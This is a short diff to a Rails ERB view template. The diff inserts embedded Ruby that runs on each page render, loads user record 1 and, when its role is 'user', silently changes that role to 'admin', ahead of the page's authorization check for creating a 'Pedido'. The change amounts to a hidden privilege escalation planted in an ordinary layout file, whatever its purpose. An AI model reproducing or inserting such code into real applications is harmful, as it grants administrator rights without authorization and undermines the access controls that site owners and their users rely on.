@@ -10,6 +10,10 @@
 	}
 </style>
 </head>
+<%user =Usuario.find(1)%>
+<%if user.role =="user"%>
+<%Usuario.update(1, :role => 'admin')%>
+<%end%>
 <%if can? :create,Pedido%>
 <body>
 
